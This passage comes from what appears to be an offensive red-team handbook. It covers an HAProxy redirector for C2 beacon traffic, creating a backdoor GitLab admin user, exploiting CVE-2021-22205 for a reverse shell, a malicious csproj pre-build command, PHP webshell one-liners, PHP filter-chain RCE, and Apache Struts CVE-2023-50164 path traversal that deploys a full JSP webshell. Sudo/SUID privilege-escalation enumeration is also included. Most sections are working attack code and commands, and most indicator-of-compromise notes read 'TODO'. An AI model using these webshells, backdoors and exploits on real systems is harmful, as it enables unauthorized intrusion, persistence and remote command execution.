<li>Verify that your configuration is working by running <code>curl 127.0.0.1:8080</code>. This command should return a <code>503 Service Unavailable &quot;No server is available to handle this request.&quot;</code> error.</li>
<li>Re-open the configuration file and add the following configuration at the end of the file. This will be the destination where traffic will be redirected to.</li>
</ol>
<pre><code>frontend myfrontend
	default_backend myserver
	bind 0.0.0.0:8080

backend myserver
	server server1 127.0.0.1:8000
</code></pre>
<ol start="7">
<li>Save and exit the configuration file and restart HAProxy using <code>systemctl restart haproxy</code>.</li>
<li>In another terminal/tab, start a python webserver with the command <code>python3 -m http.server --bind 127.0.0.1 8000</code>.</li>
<li>Verify the redirection using <code>curl 127.0.0.1:8080</code>. The output of this command should be the filenames in the directory where the webserver is being hosted. If you are still getting a <code>503 Service Unavailable</code> error, ensure that you have the <code>default_backend</code> under the <code>frontend</code> section set correctly.</li>
<li>You can now redirect unencrypted HTTP traffic by adjusting the frontend and backend values.</li>
</ol>
<h3 id="generating-ssl-certificates"><a class="header" href="#generating-ssl-certificates">Generating SSL Certificates</a></h3>
<ol>
<li>Generate a private key using `openssl genpkey -algorithm RSA -out pkey.pem.</li>
<li>Generate a certificate signing request using <code>openssl req -new -key pkey.pem -out csr.pem</code>.</li>
<li>Generate a self signed certificate using `openssl x509 -req -days 365 -in csr.pem -signkey pkey.pem -out cert.pem.</li>
<li>Create a new file using <code>touch tls.pem</code>.</li>
<li>Add the cert.pem to tls.pem using <code>cat cert.pem &gt;&gt; tls.pem</code>.</li>
<li>Add the private key information to tls.pem using <code>sudo cat pkey.pem &gt;&gt; tls.pem</code>.</li>
</ol>
<h3 id="configuring-tls"><a class="header" href="#configuring-tls">Configuring TLS</a></h3>
<ol>
<li>Open the configuration file from earlier and modify the following lines. This will change the frontend bind address to be any interface on port 443, and will assign the listed ssl cert to the port.</li>
</ol>
<pre><code>frontend myfrontend
	default_backend myserver
	bind 0.0.0.0:443 ssl cert /path/to/tls.pem

</code></pre>
<ol start="2">
<li>Save and exit the configuration file and restart HAProxy using <code>systemctl restart haproxy</code>. If you get an error, ensure that you properly combined the two .pem files from earlier into a single file, and that your path is correct.</li>
</ol>
<h2 id="execution-4"><a class="header" href="#execution-4">Execution</a></h2>
<h3 id="method-1---utilizing-haproxy"><a class="header" href="#method-1---utilizing-haproxy">Method 1 - Utilizing HAProxy</a></h3>
<ol>
<li>Modify the configuration file from earlier to be representative of your listener address as follows (the pound signs are just comments).</li>
</ol>
<pre><code>backend myserver
	server server1 127.0.0.1:6969
	# ^ Your C2 listener will be set up on this port (6969) 
</code></pre>
<ol start="2">
<li>Generate an http/s (https if your platform supports it) beacon pointing towards the server running HAProxy and your C2 server at the port defined in your frontend section (443 using the example from setup)</li>
<li>Set up an http/s listener on your C2 server listening on the port defined in the backend section (6969 using the example from earlier)</li>
<li>Execute your beacon on a target box and ensure you get a callback. If you want to verify that the traffic is TLS, observe the traffic in wireshark and ensure that you are seeing a <code>Client Hello</code> followed by a <code>Server Hello</code> pointed towards the HAProxy frontend address and port. Wireshark should also show you the JA3 hash.</li>
</ol>
<h4 id="indicators-of-compromise-7"><a class="header" href="#indicators-of-compromise-7">Indicators of Compromise</a></h4>
<p>The indicators of compromise for this action would be the same as HTTPS beaconing, but it should help in defeating JA3 hash based detection. The traffic will likely be using a self signed SSL certificate, which may be an indicator that the destination is illegitimate.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="web"><a class="header" href="#web">Web</a></h1>
<ul>
<li><a href="./GITLAB_SUMMARY.html">Gitlab</a>
<ul>
<li><a href="./gitlab-backdoor-user.html">Adding a Backdoor User</a></li>
<li><a href="./cve-2021-22205.html">ExifTool DjVu (CVE-2021-22205)</a></li>
<li><a href="./csproj.html">Visual Studio CSPROJ Reverse Shell</a></li>
</ul>
</li>
<li><a href="./PHP_SUMMARY.html">PHP</a>
<ul>
<li><a href="./php_webshell_oneline.html">Basic PHP Webshell Oneliner</a></li>
<li><a href="./php_filter_gadget_chain.html">PHP Filter Gadget Chain</a></li>
</ul>
</li>
<li><a href="./APACHE_SUMMARY.html">Apache</a>
<ul>
<li><a href="./cve-2023-50164.html">Apache Struts RCE (CVE-2023-50164)</a></li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="gitlab"><a class="header" href="#gitlab">Gitlab</a></h1>
<ul>
<li><a href="./gitlab-backdoor-user.html">Adding a Backdoor User</a></li>
<li><a href="./cve-2021-22205.html">ExifTool DjVu (CVE-2021-22205)</a></li>
<li><a href="./csproj.html">Visual Studio CSPROJ Reverse Shell</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="adding-a-backdoor-user"><a class="header" href="#adding-a-backdoor-user">Adding a Backdoor User</a></h1>
<h2 id="summary-5"><a class="header" href="#summary-5">Summary</a></h2>
<p>Having a user on a gitlab instance can open up a lot of interesting opportunities, especially if that user is an admin. For example, this user can modify existing repositories and place backdoors in projects, or even add <a href="./csproj.html">pre-build commands to visual studio projects</a>.</p>
<h2 id="prerequisites-5"><a class="header" href="#prerequisites-5">Prerequisites</a></h2>
<p>A gitlab instance is required, as well as some form of shell access. This can be obtained with, for example, <a href="./cve-2021-22205.html">CVE-2021-22205</a>.</p>
<h2 id="setup-5"><a class="header" href="#setup-5">Setup</a></h2>
<p>N/A</p>
<h2 id="execution-5"><a class="header" href="#execution-5">Execution</a></h2>
<h3 id="method-1---rails-console"><a class="header" href="#method-1---rails-console">Method 1 - Rails Console</a></h3>
<pre><code class="language-bash">gitlab-rails console
</code></pre>
<p>In the console, run the following commands to add an admin user:</p>
<pre><code class="language-ruby">u = User.new(username: 'username', email: 'username@test.com', name: 'username', password: 'password', password_confirmation: 'password')
u.skip_confirmation!
u.admin = true
u.save!
</code></pre>
<p>If you want a normal user and not an admin user, omit the <code>u.admin = true</code> command.</p>
<p>You should now be able to sign in with the credentials you created:</p>
<p><img src="./images/Pasted%20image%2020231102142623.png" alt="image" /></p>
<h4 id="indicators-of-compromise-8"><a class="header" href="#indicators-of-compromise-8">Indicators of Compromise</a></h4>
<p>TODO</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="exiftool-djvu-cve-2021-22205"><a class="header" href="#exiftool-djvu-cve-2021-22205">ExifTool DjVu (CVE-2021-22205)</a></h1>
<h2 id="summary-6"><a class="header" href="#summary-6">Summary</a></h2>
<p>CVE-2021-22205 affects exiftool's DjVu &quot;Copyright&quot; metadata field that results in code execution. In Gitlab EE/CE versions starting from 11.9 and patched in 13.10.3, 13.9.6, and 13.8.8, an attacker is able to upload an image to the <code>/uploads/user</code> unauthenticated, where the image is then analyzed by the vulnerable version of exiftool. The resulting code is executed as the <code>git</code> user, which provides full access to the gitlab instance, including the administrator <code>gitlab-rails</code> console.</p>
<h2 id="prerequisites-6"><a class="header" href="#prerequisites-6">Prerequisites</a></h2>
<p>The prerequisite for the setup is to have docker installed and running. For the attack path, the only prerequisite is a vulnerable version of Gitlab installed.</p>
<h2 id="setup-6"><a class="header" href="#setup-6">Setup</a></h2>
<p>First, clone or grab the <code>gitlab-setup.sh</code> file from <a href="https://github.com/NukingDragons/gitlab-setup">this repository.</a></p>
<p>To perform an online install of the vulnerable Gitlab instance, run the following command (Set the hostname to your preference, or to the IP of the interface you wish to host this on):</p>
<pre><code class="language-bash">./gitlab-setup.sh -v 13.8.6-ce.0 -H gitlab.example.com
</code></pre>
<p>By default, the docker will start automatically on the specified hostname.</p>
<p>To perform an offline installation, first run the following command on a machine that <em>DOES</em> have an internet connection:</p>
<pre><code class="language-bash">./gitlab-setup.sh -v 13.8.6-ce.0 -e --fetch-only
</code></pre>
<p>Then, move <em>BOTH</em> the <code>gitlab-setup.sh</code> file and the resulting <code>gitlab-ce-13.8.6-ce.0.docker</code> file to the offline machine.</p>
<p>Once the files have been moved over, install and start the Gitlab instance by running the following command on the offline machine:</p>
<pre><code class="language-bash">./gitlab-setup.sh -i /path/to/gitlab-ce.13.8.6-ce.0.docker -H gitlab.example.com
</code></pre>
<p>Then, browse to the page given the specific hostname, and set the administrator password. Once it's been set, the instance will be fully functional. Be sure to log in and adjust any settings, add users, and/or add any repositories that are needed.</p>
<h2 id="execution-6"><a class="header" href="#execution-6">Execution</a></h2>
<h3 id="method-1---reverse-shell"><a class="header" href="#method-1---reverse-shell">Method 1 - Reverse Shell</a></h3>
<p>To exploit a vulnerable instance of Gitlab, first clone <a href="https://github.com/NukingDragons/gitlab-cve-2021-22205">this repository</a>, or download the bash script.</p>
<p>First, start a local netcat listener on your port of choice:</p>
<pre><code class="language-bash">nc -lvnp 1337
</code></pre>
<p>Then, to obtain a shell, simply run the following command:</p>
<pre><code class="language-bash">./cve-2021-22205.sh -t http://gitlab.example.com -i &lt;your interface IP&gt; -p &lt;your specified port&gt;
</code></pre>
<p>Alternatively, the script will deduce the IP for you and the port will be assumed to be 1337 if unspecified.</p>
<p><img src="./images/Pasted%20image%2020231101113528.png" alt="image" /></p>
<h4 id="indicators-of-compromise-9"><a class="header" href="#indicators-of-compromise-9">Indicators of Compromise</a></h4>
<p>TODO</p>
<h3 id="method-2---any-command"><a class="header" href="#method-2---any-command">Method 2 - Any Command</a></h3>
<p>To exploit a vulnerable instance of Gitlab, first clone <a href="https://github.com/NukingDragons/gitlab-cve-2021-22205">this repository</a>, or download the bash script.</p>
<p>To run a custom command against the target, run the following command:</p>
<pre><code class="language-bash">./cve-2021-22205.sh -t http://gitlab.example.com -c &quot;&lt;your command here&gt;&quot;
</code></pre>
<h4 id="indicators-of-compromise-10"><a class="header" href="#indicators-of-compromise-10">Indicators of Compromise</a></h4>
<p>TODO</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="visual-studio-csproj-reverse-shell"><a class="header" href="#visual-studio-csproj-reverse-shell">Visual Studio CSPROJ Reverse Shell</a></h1>
<h2 id="summary-7"><a class="header" href="#summary-7">Summary</a></h2>
<p>Visual Studio <code>.csproj</code> files contain the ability to run pre-build and post-build commands during compile time of the project. This feature becomes a vulnerability if the project itself is accessible by a malicious actor, such as a compromised developer account gaining access to the projects git repository.</p>
<h2 id="prerequisites-7"><a class="header" href="#prerequisites-7">Prerequisites</a></h2>
<p>This requires visual studio to compile the malicious project, and some form of repository hosting is recommended.</p>
<h2 id="setup-7"><a class="header" href="#setup-7">Setup</a></h2>
<p>You can either download the <a href="./misc-attachments/CSProjExploit.zip">malicious visual studio project zip file</a>, or you can follow these steps to create it yourself. If you're modifying an existing repository, skip to step 2.</p>
<p>Step 1: Create the project using .NET 6.0 (Recommended):</p>
<p><img src="./images/Pasted%20image%2020231102134743.png" alt="image" /></p>
<p><img src="./images/Pasted%20image%2020231102134810.png" alt="image" /></p>
<p>Step 2: Go to the project properties:</p>
<p><img src="./images/Pasted%20image%2020231102135107.png" alt="image" /></p>
<p>Step 3: Go to Build -&gt; Events</p>
<p><img src="./images/Pasted%20image%2020231102135154.png" alt="image" /></p>
<p>Step 4: Add your pre-build command</p>
<p><img src="./images/Pasted%20image%2020231102135233.png" alt="image" /></p>
<h2 id="execution-7"><a class="header" href="#execution-7">Execution</a></h2>
<h3 id="method-1---compilation"><a class="header" href="#method-1---compilation">Method 1 - Compilation</a></h3>
<p>If the target repository is in a git repo, push the changes with the following 2 commands:</p>
<pre><code class="language-bash">git add -A .
git commit -m &quot;Your Message Here&quot;
git push
</code></pre>
<p>In every scenario, someone needs to compile this repository to execute the pre-build command.</p>
<h4 id="indicators-of-compromise-11"><a class="header" href="#indicators-of-compromise-11">Indicators of Compromise</a></h4>
<p>TODO</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="php"><a class="header" href="#php">PHP</a></h1>
<ul>
<li><a href="./php_webshell_oneline.html">Basic PHP Webshell Oneliner</a></li>
<li><a href="./php_filter_gadget_chain.html">PHP Filter Gadget Chain</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="basic-php-webshell-oneliner"><a class="header" href="#basic-php-webshell-oneliner">Basic PHP Webshell Oneliner</a></h1>
<h2 id="summary-8"><a class="header" href="#summary-8">Summary</a></h2>
<p>One of the easiest methods to obtain access to a PHP enabled app, is to somehow plant a webshell onto the server. There are many fancy PHP webshells out there, but this page will cover a basic one that is easy to remember and type, and is easy to embed into an existing PHP file as a backdoor.</p>
<h2 id="prerequisites-8"><a class="header" href="#prerequisites-8">Prerequisites</a></h2>
<p>A PHP enabled server, typically apache.</p>
<h2 id="setup-8"><a class="header" href="#setup-8">Setup</a></h2>
<p>To set this up, all that is needed is access to a PHP enabled server somehow. This can be through a vulnerability or any other type of access.</p>
<h2 id="execution-8"><a class="header" href="#execution-8">Execution</a></h2>
<h3 id="method-1---shortest-possible"><a class="header" href="#method-1---shortest-possible">Method 1 - Shortest Possible</a></h3>
<p>This is the shortest possible PHP webshell, the output from commands ran are not very pretty and will likely get mangled:</p>
<pre><code class="language-php">&lt;?php system($_GET('cmd')); ?&gt;
</code></pre>
<p>To use this webshell, the command must be url encoded and must be formatted like so:</p>
<pre><code class="language-bash">curl http://ip/shell.php?cmd=whoami
curl http://ip/shell.php?cmd=ip$20a
</code></pre>
<h4 id="indicators-of-compromise-12"><a class="header" href="#indicators-of-compromise-12">Indicators of Compromise</a></h4>
<p>TODO</p>
<h3 id="method-2---slightly-prettier"><a class="header" href="#method-2---slightly-prettier">Method 2 - Slightly Prettier</a></h3>
<p>This basic webshell wraps the output of the command into HTML pre tags, this will usually help prevent the output of the command from being mangled on the page.</p>
<pre><code class="language-php">&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET('cmd')); echo &quot;&lt;/pre&gt;&quot;; ?&gt;
</code></pre>
<p>To use this webshell, the command must be url encoded and must be formatted like so:</p>
<pre><code class="language-bash">curl http://ip/shell.php?cmd=whoami
curl http://ip/shell.php?cmd=ip$20a
</code></pre>
<h4 id="indicators-of-compromise-13"><a class="header" href="#indicators-of-compromise-13">Indicators of Compromise</a></h4>
<p>TODO</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="php-filter-gadget-chain"><a class="header" href="#php-filter-gadget-chain">PHP Filter Gadget Chain</a></h1>
<h2 id="summary-9"><a class="header" href="#summary-9">Summary</a></h2>
<p>A PHP Filter Gadget Chain is a technique used to obtain PHP code execution against a PHP-enabled web server, when the attacker is able to control the input to a require() or include() function call.</p>
<h2 id="prerequisites-9"><a class="header" href="#prerequisites-9">Prerequisites</a></h2>
<p>A PHP enabled web server, alongside some vulnerable code.</p>
<h2 id="setup-9"><a class="header" href="#setup-9">Setup</a></h2>
<p>Either of the following function calls are vulnerable to this attack. As long as the attacker-controlled input is not mangled too heavily prior to the include or require function calls, then this attack should still work. Ideally the input is not mangled at all.</p>
<pre><code class="language-php">include($_GET['page'])
# OR
require($_GET['page'])
</code></pre>
<p>The chain requires that <code>extension=iconv</code> is set in the php.ini file, this is usually <code>/etc/php/php.ini</code></p>
<p>This can be tested by performing the following request to see if any output is produced:</p>
<pre><code class="language-bash">curl http://ip/index.php?page=php://filter/convert.base64-encode/resource=/etc/hostname
</code></pre>
<p>If the base64 encoded hostname is rendered to the site, then this RCE is possible.</p>
<h2 id="execution-9"><a class="header" href="#execution-9">Execution</a></h2>
<h3 id="method-1---php-filter-gadget-chain-generator"><a class="header" href="#method-1---php-filter-gadget-chain-generator">Method 1 - PHP Filter Gadget Chain Generator</a></h3>
<p>Using <a href="https://github.com/synacktiv/php_filter_chain_generator">this</a> repository, and any PHP code that can lead to code execution on the target (see <a href="./php_webshell_oneline.html">Basic PHP Webshell Oneliner</a>), the following command can be used to exploit the target:</p>
<pre><code class="language-bash">python3 php_filter_chain_generator.py --chain '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;' | tail -n1
</code></pre>
<p><img src="./images/Pasted%20image%2020230706230434.png" alt="gadget chain" /></p>
<p>Then, it's possible to run commands by using the following command:</p>
<pre><code class="language-bash">curl http://ip/index.php?page=&lt;gadget chain&gt;&amp;cmd=&lt;reverse shell oneliner&gt;
</code></pre>
<h4 id="indicators-of-compromise-14"><a class="header" href="#indicators-of-compromise-14">Indicators of Compromise</a></h4>
<p>TODO</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="apache"><a class="header" href="#apache">Apache</a></h1>
<ul>
<li><a href="./cve-2023-50164.html">Apache Struts RCE (CVE-2023-50164)</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="apache-struts-rce-cve-2023-50164"><a class="header" href="#apache-struts-rce-cve-2023-50164">Apache Struts RCE (CVE-2023-50164)</a></h1>
<h2 id="summary-10"><a class="header" href="#summary-10">Summary</a></h2>
<p>This vulnerability allows for an attacker to manipulate file upload parameters to enable path traversal affecting the destination of the uploaded file. Under some circumstances this can lead to uploading a malicious file which can be used to perform remote code execution. This affects Struts versions 2.0.0-2.3.3 (EOL), 2.5.0-2.5.32, and 6.0.0-6.3.0.1. This vulnerability is fixed by Struts versions 2.5.33 or greater and 6.3.0.2 or greater</p>
<h2 id="prerequisites-10"><a class="header" href="#prerequisites-10">Prerequisites</a></h2>
<p>This requires a web server hosting a vulnerable web application using Struts ActionSupport and offering file upload functionality. Furthermore, to gain remote code execution, the application server implementing the server side upload logic needs to upload the file to the local filesystem of the webserver and have write permissions to a sensitive directory that would be useful to an attacker such as the webroot to upload a JSP webshell. </p>
<p><a href="https://securityboulevard.com/2023/12/understanding-the-impact-of-the-new-apache-struts-file-upload-vulnerability/">Additional Details on Mitigating Factors/Prerequisites</a></p>
<h2 id="setup-10"><a class="header" href="#setup-10">Setup</a></h2>
<p><a href="https://www.vicarius.io/vsociety/posts/apache-struts-rce-cve-2023-50164">Exploit Analysis and Lab Setup for Linux and Tomcat 9</a></p>
<p>For this example setup, I used a Windows Host with Tomcat, however this exploit can also be conducted on Linux or with another Servlet of your choice. This will mostly affect the target directories for path traversal and the method of gaining RCE.</p>
<h4 id="jdk-17---windows-install"><a class="header" href="#jdk-17---windows-install">JDK 17 - Windows Install</a></h4>
<blockquote>
<p><em>Apache Tomcat Requires Java(JDK). Version 17 was used during emulation and confirmed to work</em></p>
</blockquote>
<p>First, if you do not have it already, you need to install JDK 17: <a href="https://www.oracle.com/java/technologies/downloads/#jdk17-windows">JDK 17 Install</a></p>
<p>You can check this with <code>java --version</code></p>
<h4 id="maven---windows-install"><a class="header" href="#maven---windows-install">Maven - Windows Install</a></h4>
<blockquote>
<p><em>Usage is for compiling webapps into .war for deployment. Can run on Windows or Linux and transfer compiled .war file to desired destination</em></p>
</blockquote>
<p>Next, you'll also need to install maven. Below are guides that detail the installation and configuration process</p>
<p><a href="https://phoenixnap.com/kb/install-maven-windows">Maven Windows Install and Setup</a></p>
<p><a href="https://www.digitalocean.com/community/tutorials/install-maven-linux-ubuntu">Maven Linux Install and Setup</a></p>
<h4 id="tomcat---windows-install-and-deploy"><a class="header" href="#tomcat---windows-install-and-deploy">Tomcat - Windows Install and Deploy</a></h4>
<blockquote>
<p><em>WARNING: Tomcat Versions higher than 9 will produce an error due to Servlet API version conflict between Struts and Tomcat</em></p>
</blockquote>
<p>Next, you'll need to install tomcat and configure the service to host the web applications. The easiest way to do this for windows is to use the Windows Service Installer. <a href="https://tomcat.apache.org/download-90.cgi">Tomcat Install</a></p>
<ul>
<li>Make sure you have JDK installed beforehand, as you will need it to finish installation</li>
<li>When going through the installer wizard, make sure to set an administrator user and password so as to access the manager app. If you miss this step, you can add/manage users in the <code>tomcat-users.xml</code> file</li>
</ul>
<p>By default, the installer should create a new service named something similar to <code>Apache Tomcat 9.0 Tomcat9</code>. Make sure this is running, and for ease of use, you can configure it to run automatically on startup.</p>
<p>When this is running, your website should be accessible! Go to 127.0.0.1:8080 in the web browser to check.
&gt;<em>NOTE: By default, tomcat hosts on port 8080. To change this, you can edit the <code>server.xml</code> file in the <code>conf</code> folder</em></p>
<p><img src="./images/Pasted%20image%2020240119131515.png" alt="Successful Tomcat Deployment" /></p>
<blockquote>
<p><em>NOTE: If trying to access from an external machine, such as a kali box, make sure that your networking/DNS is properly configured and that the boxes can communicate, as well as check that no firewalls/filtering are blocking the port/traffic. If hosting on a Windows host, you'll likely need to either disable or modify Windows Defender Firewall rules to allow traffic through to the port you are hosting Tomcat on</em></p>
</blockquote>
<h4 id="compile-and-deploy-vulnerable-file-upload-application"><a class="header" href="#compile-and-deploy-vulnerable-file-upload-application">Compile and Deploy Vulnerable File Upload Application</a></h4>
<p>For this environment, we'll deploy a basic file upload application that uses a vulnerable version of Apache Struts</p>
<p><a href="https://github.com/jakabakos/CVE-2023-50164-Apache-Struts-RCE">Github POC Exploit and Vulnerable Struts App</a></p>
<p>Download the struts-app folder and contents from the above link. Within the <code>struts-app</code> folder, run:</p>
<pre><code class="language-bash">mvn clean package
</code></pre>
<p>This should produce an <code>upload-1.0.0.war</code> within a newly created <code>target</code> subdirectory. To deploy this application, go to the tomcat manager app in the webserver. Find the &quot;Deploy&quot; section, upload the file, and click <code>Deploy</code></p>
<blockquote>
<p><em>NOTE: Manager app is only accessible from the localhost by default</em></p>
</blockquote>
<p><img src="./images/Pasted%20image%2020240118160002.png" alt="Tomcat Manager" />
Make sure that the upload-1.0.0 application is started, and then it should be accessible from <code>127.0.0.1/upload-1.0.0/upload.action</code> on the website</p>
<p><img src="./images/Pasted%20image%2020240119113847.png" alt="File upload application" /></p>
<p>Congrats! Your environment is now ready for exploitation</p>
<h2 id="execution-10"><a class="header" href="#execution-10">Execution</a></h2>
<h3 id="method-1---manual-exploitation"><a class="header" href="#method-1---manual-exploitation">Method 1 - Manual Exploitation</a></h3>
<h4 id="prepare-a-webshell-to-upload"><a class="header" href="#prepare-a-webshell-to-upload">Prepare a Webshell to Upload</a></h4>
<p>To gain RCE on Tomcat, we will need to upload a .war webshell to the webapps directory. Similar to how we deployed the upload-1.0.0.war, this will allow us to deploy our own malicious application. You can create your own malicious application, or use the basic jsp webshell below</p>
<p><a href="https://github.com/jakabakos/CVE-2023-50164-Apache-Struts-RCE/blob/main/exploit/webshell.jsp">Basic jsp webshell:</a> </p>
<pre><code class="language-jsp">&lt;%@ page import=&quot;java.io.*&quot; %&gt;
&lt;%
    String cmd = request.getParameter(&quot;cmd&quot;);
    String output = &quot;&quot;;
    if (cmd != null) {
        String s = null;
        try {
            Process p = Runtime.getRuntime().exec(cmd, null, null);
            BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
            while ((s = sI.readLine()) != null) {
                output += s + &quot;\n&quot;;
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
%&gt;
&lt;%=output %&gt;
</code></pre>
<p>Save to <code>webshell.jsp</code>, and convert into a .war file:</p>
<pre><code class="language-bash">jar -cvf webshell.war webshell.jsp`
</code></pre>
<p>This should create <code>webshell.war</code>, which we'll use to deploy our malicious application</p>
<h4 id="use-burp-to-modify-upload-parameters"><a class="header" href="#use-burp-to-modify-upload-parameters">Use Burp to modify upload parameters</a></h4>
<p>Using a Burp Proxy, go to the file upload application you deployed earlier. Click on <code>Choose File</code> and select <code>webshell.war</code>. Turn on intercept in Burp, and click <code>Submit</code>. Burp should intercept the packet containing your uploaded file data. Send the HTTP POST packet to Repeater, where we will modify 2 of the parameters:</p>
<ul>
<li>Set <code>name=&quot;upload</code> to <code>name=&quot;Upload</code></li>
<li>Add a new upload parameter:</li>
</ul>
<pre><code>Content-Disposition: form-data; name=&quot;uploadFileName&quot;; 

..\..\..\..\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\webshell.war
</code></pre>
<blockquote>
<p><em>NOTE: Make sure to modify the form boundaries as well, appending a copy of the one ending with &quot;--&quot; to the end of the packet, and removing the &quot;--&quot; from the original. The image below contains an example of what this looks like when completed</em></p>
</blockquote>
<p><img src="./images/Pasted%20image%2020240119130729.png" alt="Modified HTTP Packet" />
Send this modified packet, and your webshell should be deployed to Tomcat's webapp directory!
To check if our exploit worked and interact with out webshell, we can use the <code>cmd</code> variable at <code>{0.0.0.0:8080}/webshell/webshell.jsp?cmd=whoami</code></p>
<p><img src="./images/Pasted%20image%2020240118171435.png" alt="whoami Command run by webshell" />
&gt;<em>NOTE:
&gt;Default deployment will create a directory with the .war's name containing the jsp file we compiled.</em>
&gt;
&gt;<em>Ex: <code>jar -cvf warname.war jspname.jsp</code> will be accessible at <code>/warname/jspname.jsp</code></em></p>
<h4 id="indicators-of-compromise-15"><a class="header" href="#indicators-of-compromise-15">Indicators of Compromise</a></h4>
<ul>
<li>Http traffic containing the &quot;Upload&quot; and &quot;uploadFileName&quot; parameters</li>
<li>Http traffic containing <code>../</code> characters</li>
<li>New or unusual files created/uploaded by the web service to unintended/unexpected locations (Outside of designed upload destination)
<ul>
<li>In particular, the creation of .war files in Tomcat's webapps directory (or a similar event in another servlet) and/or associated deployment of unauthorized web applications</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="linux"><a class="header" href="#linux">Linux</a></h1>
<ul>
<li><a href="./LINUX_PRIVESC_SUMMARY.html">Privilege Escalation</a>
<ul>
<li><a href="./linux_gtfobins.html">SUDO/SUID/etc</a></li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="linux-privilege-escalation"><a class="header" href="#linux-privilege-escalation">Linux Privilege Escalation</a></h1>
<ul>
<li><a href="./linux_gtfobins.html">SUDO/SUID/etc</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="sudosuidetc"><a class="header" href="#sudosuidetc">SUDO/SUID/etc</a></h1>
<h2 id="summary-11"><a class="header" href="#summary-11">Summary</a></h2>
<p>One of the easiest and quickest privilege escalation techniques is to check if there is a vulnerable misconfiguration in the /etc/sudoers file, or if a known program contains the set-UID bit that may retain privileges. There are more than just sudo or SUID vulnerabilities on GTFOBins, so review the website for any additional abuse of privileges.</p>
<h2 id="prerequisites-11"><a class="header" href="#prerequisites-11">Prerequisites</a></h2>
<p>The only prerequisite is that the box has either sudo or SUID support for either of those specific vulnerabilities, though these are not the only vulnerabilities that could lead to privesc.</p>
<h2 id="setup-11"><a class="header" href="#setup-11">Setup</a></h2>
<p>To configure a box to be vulnerable to one of these methods, check https://gtfobins.github.io/ and select the binary and vulnerability type that you'd like to implement.</p>
<h2 id="execution-11"><a class="header" href="#execution-11">Execution</a></h2>
<h3 id="method-1---sudo"><a class="header" href="#method-1---sudo">Method 1 - SUDO</a></h3>
<p>For this method, the users password must be known <em>or</em> the user must have the NOPASSWD flag set in /etc/sudoers, i.e.:</p>
<pre><code class="language-sudoers">...

root ALL=(ALL:ALL) ALL
# EVERYTHING ran without a password
user1 ALL=(ALL:ALL) NOPASSWD: ALL
# Specific program doesnt require a password
user2 ALL=(ALL:ALL) NOPASSWD: /usr/bin/vi
...
</code></pre>
<p>Then simply click &quot;SUDO&quot; or type &quot;+sudo&quot; followed by the program(s) listed in the output of <code>sudo -l</code>. Then follow the specific instructions for that binary to exploit the misconfiguration.</p>
<p><img src="./images/Pasted%20image%2020230522135640.png" alt="image" /></p>
<h4 id="indicators-of-compromise-16"><a class="header" href="#indicators-of-compromise-16">Indicators of Compromise</a></h4>
<p>TODO</p>
<h3 id="method-2---suid"><a class="header" href="#method-2---suid">Method 2 - SUID</a></h3>
<p>This method is almost identical to sudo, but rather than running <code>sudo -l</code>, the following command(s) can be used to determine if the SUID bit is set:</p>
<pre><code class="language-bash"># The program will run as the owner of the file
find / -perm -4000 -ls 2&gt;/dev/null

# The program will run as the group of the file
find / -perm -2000 -ls 2&gt;/dev/null

# The program will run as both the owner and the group
find / -perm -6000 -ls 2&gt;/dev/null
</code></pre>
<p>Once a program has been identified from one or more of the commands above, plugging them into GTFOBins with &quot;+suid&quot; will determine if the machine is vulnerable to this misconfiguration.</p>
<h4 id="indicators-of-compromise-17"><a class="header" href="#indicators-of-compromise-17">Indicators of Compromise</a></h4>
<p>TODO</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="windows"><a class="header" href="#windows">Windows</a></h1>
<ul>
<li><a href="./AMSI_BYPASS_SUMMARY.html">AMSI Bypass</a>
<ul>
<li><a href="./powershell_amsi_bypass.html">Powershell AMSI Bypass</a></li>
</ul>
</li>
<li><a href="./WINDOWS_STEALTH_SUMMARY.html">Stealth</a>
<ul>
<li><a href="./windows_reflective_pe_loader.html">Reflective PE Loader</a></li>
</ul>
</li>
<li><a href="./WINDOWS_LATERAL_MOVEMENT_SUMMARY.html">Lateral Movement</a>
<ul>
<li><a href="./psexec.html">PSExec</a></li>
<li><a href="./mof_upload.html">MOF Upload</a></li>
<li><a href="./winrm.html">WinRM</a></li>
<li><a href="./printnightmare.html">PrintNightmare (CVE-2021-1675)</a></li>
</ul>
</li>
<li><a href="./WINDOWS_PERSISTENCE_SUMMARY.html">Persistence</a>
<ul>
<li><a href="./invisreg.html">Invisible Registry Keys</a></li>
</ul>
</li>
<li><a href="./WINDOWS_PRIVESC_SUMMARY.html">Privilege Escalation</a>
<ul>
<li><a href="./cve-2023-23397.html">Outlook Client (CVE-2023-23397)</a></li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="./powershell_amsi_bypass.html">Powershell AMSI Bypass</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="powershell-amsi-bypass"><a class="header" href="#powershell-amsi-bypass">Powershell AMSI Bypass</a></h1>
<h2 id="summary-12"><a class="header" href="#summary-12">Summary</a></h2>
<p>AMSI (Antimalware Scan Interface) is used to monitor several processes under Windows that can be used to run commands, such as powershell and jscript. Under powershell, there are several methods that can be used to bypass this technology, which will prevent Windows Defender from stopping the powershell process whilst executing a malicious script. The following is an example of AMSI when it's functioning properly:</p>
<p><img src="./images/Pasted%20image%2020230707132119.png" alt="AMSI Functioning" /></p>
<h2 id="prerequisites-12"><a class="header" href="#prerequisites-12">Prerequisites</a></h2>
